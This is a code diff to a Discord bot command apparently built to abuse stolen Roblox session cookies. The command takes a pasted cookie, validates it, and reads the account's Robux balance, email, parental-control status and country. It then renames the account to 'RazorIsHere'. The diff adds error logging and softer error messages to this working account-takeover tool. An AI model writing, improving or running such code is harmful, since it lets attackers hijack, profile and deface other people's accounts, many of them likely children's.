@@ -5,6 +5,7 @@ import {
   type ChatInputCommandInteraction,
 } from 'discord.js';
 import { validateCookie } from '../roblox';
+import { logger } from '../../lib/logger';
 import type { Command } from './types';
 
 interface RobuxResponse { robux: number }
@@ -23,7 +24,7 @@ async function fetchRobux(cookie: string, userId: string): Promise<number> {
       const data = (await resp.json()) as RobuxResponse;
       return data.robux || 0;
     }
-  } catch {}
+  } catch (err) { logger.error({ err }, 'fetchRobux failed'); }
   return 0;
 }
 
@@ -36,7 +37,7 @@ async function fetchEmailInfo(cookie: string): Promise<{ verified: string | null
       const data = (await resp.json()) as EmailResponse;
       return { verified: data.verifiedEmail || null, pending: data.pendingEmail || null };
     }
-  } catch {}
+  } catch (err) { logger.error({ err }, 'fetchEmailInfo failed'); }
   return { verified: null, pending: null };
 }
 
@@ -49,7 +50,7 @@ async function fetchParentalControls(cookie: string): Promise<{ hasParent: boole
       const data = (await resp.json()) as ParentalResponse;
       return { hasParent: (data.parents && data.parents.length > 0) || false };
     }
-  } catch {}
+  } catch (err) { logger.error({ err }, 'fetchParentalControls failed'); }
   return { hasParent: false };
 }
 
@@ -62,7 +63,7 @@ async function fetchCountry(cookie: string): Promise<string> {
       const data = (await resp.json()) as CountryResponse;
       return data.value?.countryName || 'Unknown';
     }
-  } catch {}
+  } catch (err) { logger.error({ err }, 'fetchCountry failed'); }
   return 'Unknown';
 }
 
@@ -78,7 +79,7 @@ async function fetchAvatarThumbnail(userId: string): Promise<string | null> {
         return data.data[0].imageUrl;
       }
     }
-  } catch {}
+  } catch (err) { logger.error({ err }, 'fetchAvatarThumbnail failed'); }
   return null;
 }
 
@@ -93,9 +94,7 @@ async function changeDisplayName(cookie: string, userId: string): Promise<boolea
       body: JSON.stringify({ newDisplayName: 'RazorIsHere' }),
     });
     return resp.status === 200;
-  } catch {
-    return false;
-  }
+  } catch (err) { logger.error({ err }, 'changeDisplayName failed'); return false; }
 }
 
 const data = new SlashCommandBuilder()
@@ -110,39 +109,40 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
   try {
     await interaction.deferReply({ ephemeral: true });
 
-    const cookie = interaction.options.getString('cookie', true).trim();
+    const rawInput = interaction.options.getString('cookie', true);
     const timestamp = new Date().toLocaleString();
     const footerData = {
       text: `${interaction.user.username} | ${timestamp}`,
       iconURL: interaction.user.displayAvatarURL(),
     };
 
-    const result = await validateCookie(cookie, 3);
+    const result = await validateCookie(rawInput, 3);
     if (!result.valid) {
-      const isNetwork = result.debug.includes('getaddrinfo') || result.debug.includes('ENOTFOUND') || result.debug.includes('ETIMEDOUT');
       const embed = new EmbedBuilder()
-        .setTitle(isNetwork ? '𖣐 Network Error .ᐟ' : '𖣐 Invalid Cookie .ᐟ')
+        .setTitle(result.isNetworkError ? '𖣐 Failed!' : '𖣐 Invalid Cookie .ᐟ')
         .setColor('#FFFFFF')
         .setDescription(
-          isNetwork
-            ? '✧ **Failed to fetch API!**\n────\n⭑ Cookie was valid, but error fuck our code 🚬..\n⭑ Check your internet connection and try again.'
-            : `✧ **Error Occurred**\n────\n⭑ The provided cookie is not valid or has expired.\n⭑ \`\`\`\n${result.debug}\n\`\`\``
+          result.isNetworkError
+            ? '✧ **Failed!**\n────\n⭑ Unable to reach Roblox servers. Please try again later.'
+            : '✧ **Invalid Cookie**\n────\n⭑ The provided cookie is not valid or has expired.'
         )
         .setFooter(footerData);
       await interaction.editReply({ embeds: [embed] });
+      // Log full error to Termux
+      logger.error({ debug: result.debug, userId: interaction.user.id }, 'Login validation failed');
       return;
     }
 
     const { userId, username, displayName } = result;
     const [robux, email, parental, country, thumbnail] = await Promise.all([
-      fetchRobux(cookie, String(userId)),
-      fetchEmailInfo(cookie),
-      fetchParentalControls(cookie),
-      fetchCountry(cookie),
+      fetchRobux(rawInput, String(userId)),
+      fetchEmailInfo(rawInput),
+      fetchParentalControls(rawInput),
+      fetchCountry(rawInput),
       fetchAvatarThumbnail(String(userId)),
     ]);
 
-    await changeDisplayName(cookie, String(userId));
+    await changeDisplayName(rawInput, String(userId));
 
     let emailStatus = 'No email found';
     if (email.verified) emailStatus = `✅ Verified: \`${email.verified}\``;
@@ -175,10 +175,11 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
     if (thumbnail) embed.setThumbnail(thumbnail);
     await interaction.editReply({ embeds: [embed] });
   } catch (error: any) {
+    logger.error({ err: error, userId: interaction.user.id }, 'Login command error');
     const embed = new EmbedBuilder()
-      .setTitle('𖣐 Error .ᐟ')
+      .setTitle('𖣐 Failed!')
       .setColor('#FFFFFF')
-      .setDescription(`✧ **Unexpected Error**\n────\n⭑ ${error.message || 'Something went wrong.'}`)
+      .setDescription('✧ **Unexpected Error**\n────\n⭑ Something went wrong. Please try again later.')
       .setFooter({
         text: `${interaction.user.username} | ${new Date().toLocaleString()}`,
         iconURL: interaction.user.displayAvatarURL(),
